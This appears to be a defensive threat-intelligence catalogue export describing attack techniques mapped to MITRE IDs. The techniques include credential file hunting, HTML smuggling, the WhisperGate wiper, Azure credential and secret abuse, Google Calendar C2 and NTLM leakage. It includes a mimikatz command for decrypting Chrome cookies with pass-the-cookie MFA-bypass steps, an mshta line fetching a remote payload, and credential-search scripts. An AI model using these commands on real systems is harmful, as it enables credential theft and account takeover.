### AppData local user folder

AppData in the local user folder contains cleartext passwords,
web browsers cookies and other cached browser data:  

`%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Microsoft\Vault\<GUID>`

### Other possible Windows explorer locations for browsing

Some other paths in Windows Explorer may contain password manager details,
for example KeePass Password Database or similar.  

Examples for paths in Windows Explorer (local locations or network shares):

- `C:\Users\Public\TempWorkingFiles\PGM\Documents\Keepass\`
- `C:\Users\vernada\AppData\Local\Microsoft\AppV\Client\Integration\{identifier_string}\Root`
- `C:\ProgramData\AppV\{identifier_string}\Root\KeePass.exe`
- `C:\Users\USERNAME\Downloads\EBSI credentials\`
- `E:\KeePass-db\`  

### Automated scripts

The threat actors are using automated scripts that can search for specific
file extentions in Windows Explorer that usually contain sensitive data as 
user and system credentials.  

#### Batch script to search for files by a name

Example:

```
@echo off
set /p search_term=Enter search term: 
for /f ""delims="" %%a in ('dir /b /s *%search_term%*') do echo %%a
```

#### PowerShell script to search for files in Windows by content

Example:

```
$search_term = Read-Host ""Enter search term""
Get-ChildItem -Path C:\ -Recurse | Select-String -Pattern $search_term
```

#### Known extentions for files (possible to be discovered via Windows Explorer)

Browsing through Windows Explorer, threat actors are usually looking for
file extentions of files which may contain user's credentials ref [6].  

Example for file extensions that may contain credentials:  

- Compressed (archive) files: .zip, .tar, .gz, .tgz, .rar, and others
- Java source files: .java
- Text files: .txt
- PDF documents: .pdf 
- Office file documents: .doc, .docx, .rtf, .xlsx, .pptx, .pps, .ppsm, .ppsx, .ppt
- Backup files: .bak, .old and others
- Archive files: .7z, .zip , .rar
- Database files: .kd , kdbx, mdb
- Configuration files: .config, .xml, .xsml, .xsl, .xsd, .xps, .sys
- Execution files: .exe, .cmd, .ps1
- Libraries: .dll
- Shell configuration files: .bashrc, .zshrc, .cshrc
- User AWS Folder .aws/credentials
- Other possible files that may contain credentials: csv, tmp, .ssh, .wxs
",1,2025-03-10,2025-03-12,,,,"[Mobile] APT28, APT28, [Enterprise] APT29, APT29, [ICS] OilRig, OilRig","T1003, T1552.001, T1005, T1552"
eca91e9a-616f-4439-ac03-5d0ecc2266df,Non-Approved container image deployed to run cryptominer,Threat Vectors,clear,"A threat actor can gain access to deployment workflows and pipelines and can then abuse acquired access to deploy images of their own choosing to deploy a cryptominer either directly via a malicious image, or by deploying a clean image first and then a cryptominer and C2 Infrastructure",1,2022-06-29,2022-06-29,,,,"[Enterprise] TeamTNT, TeamTNT","T1610, T1525, T1496"
c7ed4fad-a58f-47da-9938-4a673526b3f4,HTML smuggling technique,Threat Vectors,clear,"HTML smuggling is a technique used by attackers to embed a malicious
code within HTML files, which are then smuggled past security controls,
such as firewalls, intrusion detection systems, and web application
firewalls. This is achieved by exploiting the way HTML files are
processed by web browsers.

### How HTML smuggling works?

HTML smuggling uses legitimate features of HTML5 and JavaScript,
which are both supported by all modern browsers, to generate malicious
files behind the firewall. Specifically, HTML smuggling leverages the
HTML5 “download” attribute for anchor tags, as well as the creation
and use of a JavaScript Blob to put together the payload downloaded
into an affected device.

In HTML5, when a user clicks a link, the “download” attribute lets
an HTML file automatically download a file referenced in the “href”
tag. For example, the code below instructs the browser to download
a malicious document from its location and save it into an own
device (save “malicious.docx” to “safe.docx”) ref [1].  

```html
<a href=""/malware/malicious.docx"" download=""safe.docx"">Click</a>
```

In some of the reports and analysis is mentioned that a threat actor
can create an HTML file that contains malicious code, such as JavaScript,
executable files or other type of malicious payload, encoded in a way
that evades detection by security controls. The HTML file is then sent
to the victim's web browser, which processes the file and executes the 
malicious code. The code can be used to download and install malware,
steal sensitive information (PII or other data of interest, belongings
to an organisation or a company), or in some cases to fully take control
of the victim's system ref [2],[3].    

HTML smuggling can be used for malware delivery, for example in an email
to the end user when after execution can deploy a Trojan, RAT, a backdoor
or other type of malware depends on the attacker's goal ref [1]. 

### Different types of HTML smuggling

There are several types of HTML smuggling techniques, for example:

- CSS smuggling - this involves using Cascading Style Sheets (CSS) to
embed malicious code within an HTML file.
- JavaScript smuggling - this involves using JavaScript to embed malicious
code within an HTML file.
- HTML5 smuggling - this involves using HTML5 features, such as the
<canvas> element, to embed malicious code within an HTML file.  
",1,2025-06-30,2025-07-01,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']}","[Enterprise] APT29, APT29","T1190, T1189, T1204, T1027.006"
2d7ed070-e5c5-4796-b150-ea1d02ed1785,Azure - Storage container reconnaissance,Threat Vectors,clear,"Azure storage container reconnaissance is a threat vector involving adversaries 
actively or passively gathering information about Azure Storage accounts and their 
containers to identify potential targets for further exploitation. This reconnaissance 
phase is critical for attackers to map the attack surface, discover misconfigurations, 
and locate storage resources that may be exposed or contain sensitive data.

## Key Techniques Used in Azure Storage Container Reconnaissance

- **Storage Account Discovery**: Attackers enumerate Azure Storage account names 
to find active accounts. Techniques include:
  - Using search engine dorks (e.g., `site:*.blob.core.windows.net`)
  - Brute-force enumeration of account names
  - Leveraging public scanning tools such as Microburst and BlobHunter
  - Crawling for storage endpoints referenced in public websites or code repositories

- **Public Container Discovery**: Once a storage account is identified, attackers 
enumerate container names within that account. They attempt to:
  - List container names by guessing or brute-forcing
  - Use scripts or automated tools to scan for containers with public or misconfigured access

- **DNS/Passive DNS Enumeration**: Attackers query DNS records or use passive DNS 
databases to identify valid Azure Storage account names in the wild. This can reveal 
storage endpoints that may not be directly linked from public sources.

- **Victim-Owned Website Analysis**: Attackers analyze a target’s own websites for 
references or direct links to Azure Storage containers, which can reveal storage 
account URLs and access patterns.

## Tools and Methods

- **Automated Scanning Tools**: Tools like Microburst and BlobHunter automate the 
process of discovering storage accounts and containers by scanning for open or misconfigured 
resources.
- **Scripting and Brute-Force**: Custom scripts may be used to guess container names 
or enumerate access permissions.
- **Search Engine Indexing**: Attackers use indexed URLs from search engines to 
find publicly accessible containers.
",3,2025-05-27,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1087.004, T1046"
68ab86f6-378d-4371-ad01-6209fb95d57d,WhisperGate wiper,Threat Vectors,clear,"WisperGate is a multi-stage malicious wiper disguised as ransomware,
firstly considered as ransomware but later investigations and analysis
show that it's not only disabling the work of the impacted device
but deletes/corrupts the whole hard drive and destroys the data stored
on it by wiping the master boot record. ref [1]

This is very impactful and severe type of a malware because the system
needs the MBR (the Master Boot Record) to start the operation system
during the boot.   

For the first time this type of a wiper was observed in the beginning
of the conflict between Russia and Ukraine in Feb 2022. Later the
reports published new activities of WisperGate as part of a more
broader campaign that aimed to coordinate destructive cyberattacks
against critical infrastructure and other targets in a combination
with kinetic military operations (active physical operations on
place).

The GRU's WhisperGate campaign targets government and military
institutions and the goal is to achieve as much as possible
disruption of the systems and a total lost of any stored
information on them.   

Different research investigations showed that initally it was
likely that stolen credentials provided the access point for
the deployment of the wiper. Other known for this wiper at this
moment is that it contains two types of wipers.   

1. The first wiper attempts to destroy the master boot record (MBR) and
to eradicate any recovery options. Similar to the notorious NotPetya wiper
that masqueraded as ransomware, WhisperGate is not intended to be an actual
ransom attempt, since the MBR is completely overwritten. ref [2]      

2. In the second stage, a downloader pulls the code required for
the third step. After a base64-encoded PowerShell command is executed
twice and an endpoint is requested to enter sleep mode for 20 seconds.
A Discord server URL, hardcoded into the downloader, is then pinged
to grab a .DLL file. ref [2]  

In the further stage of the attack process DLL loader is trying
to gain administrative privileges. For example, it will attempt
to escalate itself by trigger User Account Control (UAC) dialog box.
Once granted Administrator privileges it drops VBScript from a Temp
directory. The script adds the targeted logical drive to the Windows
Defenders list of exclusions, using PowerShell commands ref [5].    

The script contains encoded assembly parts. For decoding of this function,
a threat actor uses obfuscation Eazfuscator tool. It can use a combination
of RC4 and XOR loop to decode the content off the base64 string.  

The script uses another PowerShell commands further to stop the function
of Windows Defender and uses a second command with ""rmdir"" to recursively
delete all Windows Defender files.

The threat actors developed WhisperGate implemented their own cryptographic
functions that are built on top of standard and proven libraries. They
attempted to wipe files in a strange and seemingly slap-dash manner,
which may or may not have been intentional. ref [5]  

In Ukraine, a pro-Russian group was detected to conduct destructive attacks
such as the WhisperGate wiper attacks against ICS targets.  
",1,2024-09-11,2024-09-11,,,,"[Enterprise] Ember Bear, DEV-0586","T1485, T1561.001, T1561.002, T1562.001, T1036, T1134.002"
2743bf18-3b86-4721-bf3e-153dcda0b149,Azure - Valid Credentials,Threat Vectors,clear,"This threat vector within the Initial Access phase represents a significant risk 
in Azure environments. This attack technique—formally designated around adversaries 
acquiring and abusing legitimate authentication credentials to gain access to Azure 
resources or Azure Active Directory (AzureAD).

### Example Attack Scenario

- The attacker logs in directly to the Azure Portal or via CLI (e.g., `az login`) 
using valid credentials.
- Once inside, the attacker can enumerate resources, exfiltrate data, manipulate 
configurations, or leverage the account for further attacks, depending on the permissions 
granted to the compromised account.
- If privileged service principal credentials are obtained, the attacker can use 
secrets or certificates to automate access and escalate privileges.

### Attack Goals and Impact

- **Primary Goals:**
  - Establish initial access to Azure environments in a stealthy, low-noise manner 
  by using valid, non-malicious authentication flows.
  - Access sensitive data, manipulate cloud resources, and potentially escalate 
  privileges or persist within the target environment.

- **Impact:**
  - Complete compromise of Azure resources accessible by the stolen account (files, 
  databases, VMs, identity services, etc.).
  - Potential for privilege escalation if the account is eligible for higher roles 
  or Privileged Identity Management (PIM).
  - Ability to create backdoors, perform lateral movement, and evade detection (since 
  all actions appear legitimate).
  - Depending on account privileges, ransomware deployment, data exfiltration, and 
  broad access to organizational assets may occur.

### Attack Flow and Methodology

1. **Reconnaissance**
  - Attackers gather information on users or service principals, identifying potential 
  targets through open-source intelligence, misconfigurations, or enumeration of 
  publicly accessible resources.

2. **Credential Acquisition**
  - Common methods: phishing (email/SMS/voice), brute-force/password spraying, 
  harvesting credentials from previous breaches, or exploiting cloud API/application 
  misconfigurations.
  - Service principal secrets/certificates may be obtained from publicly accessible 
  repositories, misconfigured code, or automation scripts.

3. **Authentication**
  - Adversary logs into Azure Portal or invokes cloud APIs using the acquired credentials.
  - For service principals: authentication occurs via CLI or programmatic access 
  using certificates/secrets.

4. **Enumeration and Expansion**
  - Mapping out resources, roles, permissions; searching for sensitive data or 
  additional high-value targets.
  - Assessing role activation and privilege escalation opportunities (e.g., via 
  PIM or RBAC misconfigurations).

5. **Execution of Attack Objectives**
  - Data exfiltration, sabotage, account persistence (creating additional user 
  accounts or credentials), lateral movement to other resources, or exploitation 
  for financial gain.
  - Actions are typically performed under the guise of the legitimate account to 
  avoid detection.

6. **Persistence and Defense Evasion**
  - Adversaries may create new accounts, modify access policies, or abuse automation 
  to ensure continued access.
  - Use of valid credentials enables attackers to blend with legitimate user activity, 
  thus evading many traditional security detection systems.
",2,2025-08-14,2025-09-04,,,"{'sequence::preceeds': ['a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b', '66aafb61-9a46-4287-8b40-4785b42b77a3', 'c698fc79-3ed6-44a7-a9d7-bc447600e4c3', '5d43ef75-4637-4a75-b1ed-6716052cff0e', '60c5b065-7d06-4697-850f-c2f80765f10b', '6e988fa7-69c9-4aef-897c-a34fa5066dac', '78d5e363-14db-40c0-a1c4-4ba02a3e60d4', '2fd1cddb-c66d-4a99-9779-31e32b67495e', '20bd3620-b13b-4895-b291-b1a26bd9aef3', 'f18be76e-f2b3-410a-80c5-d67e7b8e7b03', '50c7e353-ac1c-48a7-8c98-2515b45f31f4', '23f6a192-a25d-48b8-a235-7bb55e483682']}","APT28, APT29, APT33, APT5, Scattered Spider, HAFNIUM, [Enterprise] Ke3chang, LAPSUS","T1078.004, T1110, T1555"
37381f28-ad9f-40c3-80f8-d8a82d6ce9a3,Resource Secret Reveal in Azure,Threat Vectors,clear,"The following threat vector involves adversaries accessing sensitive secrets, keys, 
or credentials stored or used by Azure resources such as KeyVaults, Storage Accounts, 
Automation Accounts, or within deployment histories.

### Example Attack Scenario

An attacker with sufficient privileged access in Azure exploits misconfigured permissions, 
allowing them to access a Storage Account and execute the `listkeys` action. This 
reveals access keys that grant full control over the account's data. Alternatively, 
by editing or viewing Azure Automation Account runbooks or Resource Group deployment 
history, the attacker discovers embedded credentials or secrets used in automation 
processes, which may then be used to escalate privileges or move laterally within 
the environment.

### Attack Goals and Impact

- **Primary goal:** Exfiltrate sensitive secrets, such as Storage Account access 
keys, service principal credentials, KeyVault secrets, or any plaintext credentials 
exposed in ARM templates or automation runbooks.
- **Impact:** Once these secrets are exposed, attackers can impersonate service 
identities, gain unauthorized access to data, break the integrity and confidentiality 
of cloud services, or launch further attacks including data exfiltration, lateral 
movement, persistence, or privilege escalation.

### Attack Flow and Methodology

- **Reconnaissance:** Identifies potential resources containing secrets, such as 
Storage Accounts, Automation Accounts, or deployment resource groups.
- **Execution:** 
    - For Storage Accounts: Executes `Microsoft.Storage/storageAccounts/listkeys/action` 
    to dump access keys.
    - For Automation Accounts: Edits or reviews runbooks to extract embedded credentials.
    - For Resource Groups: Reads deployment history to extract secrets/credentials 
    embedded in ARM templates.
- **Objective:** Uses the exfiltrated secrets to access additional resources, escalate 
privileges, or maintain persistence in the Azure environment.
",1,2025-09-15,2025-09-15,,,"{'atomicity::implemented': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53f4e2f0-7d11-4629-bb26-905993a589db', '81338b90-f80c-40cc-8a57-ba97cdf86948'], 'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149'], 'support::synergize': ['bcf3bb96-ed97-4853-98ab-937c2d214f4e']}",,"T1552, T1003, T1555"
02810748-52b5-4d3a-a788-29a948538cd2,Admin SMB shares privilege escalation exploit,Threat Vectors,clear,"One of the most common ways adversaries leverage SMB and Windows Admin
Shares is in conjunction with another technique, T1570: Lateral Tool
Transfer. In other words, they move payloads from one endpoint to another
and execute them. Adversaries do this with native utilities like net.exe or
through functionality provided by command and control (C2) frameworks - to
name just a couple of the many options available. Additionally, adversaries
can use Admin Shares for privilege escalation using tools like PsExec, a 
Sysinternals tool that enables remote system management.

### Possible patterns of malicious activity

- Remote file copy and retrieval - attackers can use tools such as SMBexec to 
create a temporary share to copy files to and then remotely parse their 
contents. An adversary could accomplish this similarly by leveraging tools 
like WMIexec or MMCexec.

- Lateral movement and privilege escalation - Most C2 Frameworks provide 
built-in functionality for lateral movement or privilege escalation utilizing 
PsExec-like functionality. In the case of Cobalt Strike, beacons leverage the 
Service Control Manager to copy a binary to the ADMIN$ share on the target 
endpoint and leverage a service for execution.

Common offensive and dual-use tools that leverage SMB/Windows Admin Shares 
include:

- PsExec
- Impacket's SMBexec and WMIexec
- `net.exe`
- Probably all C2 frameworks (commercial and open source)
",1,2025-07-29,2025-08-26,,,"{'atomicity::implements': ['75415bc5-6615-487e-a69c-7a4ffc196996'], 'sequence::succeeds': ['f33a693b-04cd-476e-9067-9deab561e55a']}","[Enterprise] APT39, APT39","T1210, T1078, T1021.002, T1570"
78683822-44dc-41ac-8fef-b5f0968743c9,Malicious Software Dependencies Faking Known Packages,Threat Vectors,clear,"Adversaries maymimick known and trusted software packages and
distributors, with the intent to be mistaken for the original developer,
and thus deliver malicious code that will be embedded in the
victim's applications. They may use sophisticated automation
to appear convincing and fool the target. Once delivered, the package may
contain any payload, from crypto mining, to credential theft, command and control etc.",3,2022-04-05,2025-10-01,,,,,T1195
b954303c-0ad0-4dc0-b5ca-492c3de9cd53,Collecting sensitive information via custom script extensions,Threat Vectors,clear,"Custom Script Extensions in Azure are powerful automation tools for configuring 
and managing Virtual Machines (VMs). However, attackers can exploit these extensions 
to collect sensitive information in a variety of ways.

## Credential Harvesting
- **Stored Credentials:** Attackers deploy scripts that search for credentials stored 
in plaintext files, configuration files, or environment variables.
- **Credential Managers:** Scripts can target credential managers or vaults such 
as Azure Key Vault, Windows Credential Manager, or third-party vaults to extract 
stored credentials.

## Configuration Files and Secrets
- **Configuration Files:** Scripts can systematically search for and exfiltrate 
configuration files containing sensitive data like database connection strings, 
API keys, or other secrets.
- **Environment Variables:** Attackers can extract environment variables that hold 
sensitive configuration or authentication information.

## Log Files and Audit Trails
- **Log Files:** Scripts can access and exfiltrate log files that may contain sensitive 
information, such as authentication logs, database logs, or application logs.
- **Audit Trails:** Attackers can collect and exfiltrate audit trails that record 
administrative actions or other sensitive activities.

## Memory Scraping
- **Running Processes:** Scripts can be designed to scrape memory from running processes 
to extract sensitive information like session tokens, encryption keys, or other 
in-memory data.
- **DLL Injection:** Attackers can use DLL injection techniques within scripts to 
extract sensitive data from running processes.

## Network Traffic Interception
- **Network Sniffing:** Scripts can enable network sniffing tools to capture sensitive 
information transmitted over the network.
- **Proxy Servers:** Attackers can configure proxy servers via scripts to intercept 
and log network traffic, capturing sensitive data in transit.

## Exploitation of Vulnerabilities
- **Unpatched Software:** Attackers can exploit vulnerabilities in unpatched software 
to gain elevated privileges and execute scripts that collect sensitive information.
- **Misconfigurations:** Misconfigurations in the VM or the environment can be exploited 
to deploy and run malicious scripts.

## Data Exfiltration Channels
- **External Storage:** Scripts can exfiltrate collected data to external storage 
solutions such as Azure Blob Storage, external servers, or other cloud storage services.
- **Email Exfiltration:** Attackers can use scripts to send sensitive information 
via email to an external address.
- **Command and Control (C2) Servers:** Scripts can communicate with C2 servers 
to exfiltrate data and receive further instructions.

## Persistent Data Collection
- **Scheduled Tasks:** Attackers can create scheduled tasks or services that periodically 
execute scripts to collect and exfiltrate sensitive information over time.
- **Backdoor Scripts:** Scripts can be designed to act as backdoors, allowing attackers 
to execute commands and collect data as needed.
",1,2025-06-11,2025-06-11,,,,,"T1059, T1651, T1119"
630f420b-b844-42f1-8be1-d367b3734024,Mimikatz browser cookie extraction,Threat Vectors,clear,"We describe how an attacker could extract cookies using the example of the Chrome browser.

Chrome stores cookies in the following location in a SQLite database:
%localappdata%GoogleChromeUser DataDefaultCookies

The cookies for a given user are encrypted using keys tied to that user via the
Microsoft Data Protection API (DPAPI). To access the cookie database and decrypt 
the cookies, an adversary can use the following mimikatz command:

dpapi::chrome /in:""%localappdata%GoogleChromeUser DataDefaultCookies"" /unprotect

Alternatively, adversaries could execute the following from the command line:
mimikatz.exe privilege::debug log ""dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect"" exit

Using either of these options will provide the browser cookies.


## PtC attack scenario

1. A sysadmin uses regularly the Azure management portal, MFA is enabled with the authenticator
   app on his mobile device.
    
   He has clicked on a phishing email or his system has been compromised by some other means,
   and now an attacker is able to execute code within the user context.

2. Execute Mimikatz when running as the user
   mimikatz.exe privilege::debug log ""dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect"" exit
    
   Attackers look for the Azure authentication cookies, including ESTSAUTH, ESTSAUTHPERSISTENT and ESTSAUTHLIGHT.
    
3. To pass the cookies into another session to take over the user account, opening Chrome on another server
   and use the “Inspect” interface to insert a cookie.
    
    Add the ESTSAUTH or If ESTSAUTHPERSISTENT cookie. If ESTSAUTHPERSISTENT is available, it is preferred because
    it is generated by the “Stay Signed In” option.     

4. Refresh the page and now attackers are logged into Azure as the user — no MFA required.
",1,2024-11-05,2024-11-05,,,"{'sequence::succeeds': ['7351e2ca-e198-427c-9cfa-202df36f6e2a'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}","[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1111
3f0b4b8e-6017-406a-9461-740d542d0917,Google Calendar service as C2,Threat Vectors,clear,"In some of the reports and analysis a Chinese-affiliated threat actor was
observed abusing Google Calendar to deliver malware and establish Command
and Control (CnC) communication.  

### Abuse of Google calendar

A malware delivered payload has the capability to read and write events with
an attacker-controlled Google calendar. Once executed, this malware creates
a zero minute calendar event at a hardcoded date, with data collected from
the compromised host being encrypted and written in the calendar event
description.  

A threat operator places encrypted commands in calendar events on this date
and next one day, which are predetermined dates also hardcoded into the
malware. The malicious code then begins polling calendar for these events.
When an event is retrieved, the event description is decrypted and the
command it contains is executed on the compromised host. Results from the
command execution are encrypted and written back to another calendar event
ref [1]. 

In several steps below is represented the threat vector pattern how the
threat actor manages to exploit a Google calendar ref [1]. 

- Initial access : The threat actor gains initial access to a victim's
Google account, often through phishing or credential reuse.
- Google calendar creation: As a next step the malicious actor creates
a new Google Calendar event, which is used as a mechanism to deliver
malware to the victim's device.
- Malicious event creation: The threat actor creates a new event in the
victim's Google calendar, which includes a malicious link or attachment.
The event is often titled with a misleading or innocuous name to avoid
suspicion.
- Notification and delivery: When the event is created, Google calendar
sends a notification to the victim's device, which includes the malicious
link or attachment. If the victim interacts with the notification,
the malware is delivered to their device.
- CnC Communication: Once the malware is installed, the threat actor
uses the compromised device to establish CnC communication. The malware
communicates with the threat actor's command and control server, allowing
them to issue commands, exfiltrate data, and further compromise the
victim's network.  

Where

- C2 server - is the attacker controlled calendar. C2 commands are passed as
encrypted google calendar events.
- C2 communication - established from the agent to the attacker controlled
google calendar over HTTPS to Google API, using valid credentials.
- C2 agent - posts computer information into the attacker controlled google
calendar. 

More detailed explanation is provided in ref [1].  

### Used known tactics

- Event titles and descriptions: A Chinese-based threat actor group uses
misleading event titles and descriptions to avoid suspicion and increase
the likelihood of the victim interacting with the malicious event.
- Malicious links and attachments: The threat actor uses malicious links or
attachments in the event to deliver malware to the victim's
device.
- Calendar settings abuse: The threat actor configures the Google calendar
settings to send notifications to the victim's device, ensuring that the
malware is delivered even if the victim doesn't actively check their
calendar.

By abusing Google calendar, the threat actor is able to deliver malware and
establish CnC communication in a way that is difficult to detect and block.
This tactic highlights the importance of monitoring cloud services and
implementing robust security controls to prevent such attacks ref [1], [2].  
",1,2025-06-11,2025-07-04,,,{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df']},"[Mobile] APT41, APT41","T1566.002, T1204.002, T1190"
662af2da-7017-4899-88fc-e77617a15130,Grager backdoor,Threat Vectors,clear,"A previously unseen backdoor named Grager was deployed against three
organizations in the past - Taiwan, Hong Kong, and Vietnam in April
2024. Trojan.Grager is a second APT malware implant leveraging the
Microsoft Graph API from a multi-step malware campaign abusing
cloud services ref [1, 2].  

The analysis of the backdoor revealed that it used the Graph
API to communicate with a C&C server hosted on Microsoft OneDrive.
Grager was downloaded from a typosquatted URL mimicking an open-
source file archiver 7-Zip (7 zip .msi file) ref [1].  

The .msi dropper, is a Trojanized 7-Zip installer that installs
the real 7-Zip software into the Windows Program Files folder
(C:\Program Files (x86)\7-Zip) along with a malicious DLL named
`epdevmgr.dll`, a copy of the Tonerjam malware, and the encrypted
Grager backdoor into a file named `data.dat` ref [1].   

The backdoor leverages a custom application layer protocol for
communication with its command and control server, allowing it to bypass
traditional network security tools and evade detection. Grager employs
various stealth techniques, such as obfuscation and anti-analysis methods,
to evade antivirus software and remain undetected.  
",1,2024-10-16,2024-10-16,,,,,"T1071, T1105, T1059"
dcccd7e5-9d3f-4b36-853a-5cd18a7ef752,Linux kernel module injection from container,Threat Vectors,clear,"Loadable Kernel Modules (LKM) can be used by adversaries to deliver 
sophisticated and hard to detect rootkits. Each event where kernel modules 
are loaded from a container should be investigated with the exeption of 
Security tools deployed in containers.

An injected kernel module is just code execution, and can in theory do 
more or less anything, but threat actors mostly use this for dwelling and 
for hiding their presence on a system.
",2,2023-01-09,2023-01-10,,,,,T1547.006
cef11e0a-32c7-46c6-8c9c-667d0f1055e2,Use of customervoice.microsoft.com to host Phishing domains,Threat Vectors,clear,"This threat vector is based on real phishing domains built and utilized by
a real, still unknown threat actor. The subdomain 
customervoice.microsoft.com should be blocked on forward proxies by most 
organizations, unless they have legit reasons to have traffic to this, and
legit traffic going there.
",1,2022-10-25,2022-10-25,,,,,"T1566.002, T1566.003"
02311e3e-b7b8-4369-9e1e-74c0a844ae0f,NTLM credentials dumping via SMB connection,Threat Vectors,clear,"### Attack vector related to Outlook vulnerability CVE-2023-23397

**key point: no user interaction**  

An attacker sends an email message with an extended MAPI property with a 
UNC path pointing to an SMB network share on a threat actor-controlled 
server.  

When a vulnerable Microsoft Outlook client (CVE-2023-23397) 
receives in the inbox, it processes that email.  

Without any user interaction, a connection to the remote SMB server is 
established and the user's NTLM negotiation message are passed in the 
hearders.  

The attacker can capture this message tp replay for authentication 
against other systems that support NTLM authentication.  

The attacker may also try to crack the original password if not too 
complex.  

The outbound NTLM negotiation message is passed with SMB and WebDav 
protocols (see Didier Steven's blog).

### Attack vector using a link a user will be enticed to click on

**key point: the user needs to click on the link**  

This attack is a subset of attackers objectives when using spear 
phishing emails with a link in message body or in an attachment.

#### Attack vector using Outlook vulnerability

A vulnerability like CVE-2024-21413, also known as the MonikerLink bug, 
allows remote code execution and the leakage of local NTLM information.  

Moniker-based links exploit a logic flaw in how vulnerable versions
of Outlook process certain file types, causing files to open in
editing mode instead of the sandboxed `Protected View`.  

If the malicious link points to SMB shares controlled by the attacker,
Windows automatically attempts to authenticate using NTLM credentials
enabling threat actors to steal NTLMv2 hashes for initial access.  
",3,2023-03-17,2025-02-24,,,,"[Mobile] APT28, APT28, TA577","T1187, T1190, T1068, T1212"
767f10bd-1947-44e3-b999-5fbf50d99027,Abuse of mshta,Threat Vectors,clear,"Mshta.exe is a legitimate Microsoft binary used for executing 
Microsoft HTML Application (HTA) files. Because mshta.exe is digitally signed 
by Microsoft, malicious actors often abuse it as a ""Living off the Land"" binary 
(LOLBin) to evade detection. Attackers can craft malicious HTA or VBScript code 
and pass it to mshta.exe, effectively bypassing many traditional endpoint 
security controls.  

Threat actors have leveraged mshta.exe to stealthily download and execute 
malicious payloads. By embedding or obfuscating their scripts within HTML 
or JavaScript code, adversaries can launch mshta.exe to pull additional 
malware from remote servers.  

Mshta.exe can also be invoked using command-line arguments that specify 
a remote or local HTA file. An example of such an abuse might look like:  

```bash
mshta.exe https://malicious[.]domain/payload.hta
```

or

```bash
mshta.exe C:\Path\To\MaliciousScript.hta
```

Once executed, mshta.exe runs with the same privileges as the invoking user 
(or higher, if misconfigurations or stolen credentials allow for elevated privileges).
",1,2025-01-09,2025-01-09,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878",T1218.005
61ddc240-e5a6-4ca8-ae77-6b471b498913,Code execution via custom script extensions in Azure,Threat Vectors,clear,"The Azure Custom Script Extension (CSE) is designed to automate post-deployment 
tasks on virtual machines (VMs) by downloading and executing scripts provided by 
users. While this is intended for legitimate configuration and management, it introduces 
a powerful threat vector: attackers with sufficient Azure permissions can leverage 
CSE to execute arbitrary code as SYSTEM (Windows) or root (Linux) on any accessible VM.

### How Attackers Exploit This Vector

- **Privilege Abuse**: If an attacker compromises an account with the *Virtual Machine 
Contributor* role or any role that grants `Microsoft.Compute/virtualMachines/extensions/write` 
permissions, they can deploy or update custom script extensions on target VMs.
- **Arbitrary Code Execution**: The attacker can specify any script (PowerShell, Bash, etc.) 
to be downloaded from a remote location (such as a malicious website or public repository) 
and executed with the highest local privileges on the VM.
- **Bypassing Network Controls**: Because CSE operates through the Azure control 
plane, it does not require direct network access to the VM. Scripts can be executed 
even if RDP or SSH ports are closed, bypassing traditional network-based restrictions.
- **Persistence and Lateral Movement**: Attackers can use CSE to establish persistence 
(e.g., by installing backdoors), harvest credentials, or pivot to other resources 
within the environment.
- **Stealth**: Since CSE operations are part of normal Azure VM management workflows, 
malicious activity may blend in with legitimate administrative actions.

### Example Attack Scenario
- An attacker uploads a malicious script to a public storage location.
- Using compromised credentials with the necessary Azure permissions, the attacker 
configures the CSE on a target VM to download and execute the script.
- The script runs as SYSTEM/root, granting full control over the VM, and can perform 
actions such as installing malware, mining cryptocurrency, exfiltrating data, or 
creating new privileged accounts.

### Real-World Impact
- **Observed Cases**: There have been documented incidents where attackers used 
the CSE to deploy cryptocurrency miners across multiple customer environments by 
referencing a malicious script hosted on a public GitHub repository.
- **Scope of Access**: This technique is not limited to individual VMs; it can be 
used on VM scale sets and Azure ARC-managed resources, amplifying the potential impact.
- **No Network Barriers**: The attack is effective regardless of the VM’s network 
security group settings or firewall rules, as it leverages the Azure management plane.
",3,2025-05-15,2025-09-08,,,"{'support::enabled': ['140907eb-c9fb-4330-9d71-656422388b2b', '2743bf18-3b86-4721-bf3e-153dcda0b149']}",,"T1555, T1190, T1204"
942ed69c-700a-469a-9591-07b87815a909,Azure - Storage Account Replication,Threat Vectors,clear,"The following threat vector enables adversaries to misuse Azure Storage's replication 
features for data exfiltration or to facilitate other attacks with significant business impact.

## Example Attack Scenario

An attacker compromises access to a victim's Azure Storage account, obtaining enough 
permissions to configure **object replication**. The attacker then creates their 
own storage account in a different Azure tenant or region and establishes a replication 
policy from the victim's storage. As a result, sensitive or operational data is 
asynchronously and automatically copied from the victim’s container to the attacker's 
environment—potentially outside tenant or even cross-cloud provider lines—without 
further interaction. The attacker can now access the replicated content at will, 
maintaining persistence and visibility even if their original access to the victim 
account is revoked.

## Attack Goals and Impact

- **Exfiltration**: The primary goal is the **covert exfiltration of data**—potentially 
at massive scale and with minimum detection, because the process leverages legitimate 
replication mechanisms.
- **Persistence and Stealth**: By using cross-region or cross-tenant replication, 
an attacker ensures ongoing access to copied data even after being discovered and 
evicted from the original environment.
- **Evasion and Regulatory Breach**: Since Azure Storage object replication can 
occur across geographical boundaries, this attack can make detection harder and 
may also result in regulatory compliance violations (e.g., unauthorized cross-border 
data transfers).
- **Potential for Secondary Impact**: With replicated data, attackers may enable 
ransomware (encrypting or destroying primary data, but retaining a copy elsewhere), 
enable further attacks by gleaning credentials or configuration details from exfiltrated 
files, or deliver **malware** to victim environments using inbound replication.

